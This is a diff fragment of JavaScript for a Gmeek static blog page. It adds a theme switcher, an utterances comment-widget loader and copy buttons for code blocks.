+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","dehua-rd/dehua-rd.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
